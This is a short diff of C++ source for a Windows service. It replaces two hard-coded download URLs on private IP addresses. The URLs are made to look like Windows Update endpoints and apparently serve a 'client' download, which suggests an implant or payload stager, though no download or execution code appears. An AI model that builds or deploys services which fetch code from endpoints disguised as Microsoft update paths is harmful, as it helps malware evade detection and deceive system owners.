@@ -11,8 +11,8 @@ std::wstring localDir;
 std::wstring fullUrl;
 
 std::vector<std::wstring> remoteUrls = {
-    L"http://192.168.14.102:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
-    L"http://192.168.14.101:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
+    L"http://192.168.7.20:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
+    L"http://192.168.7.16:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
 };
 
 void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
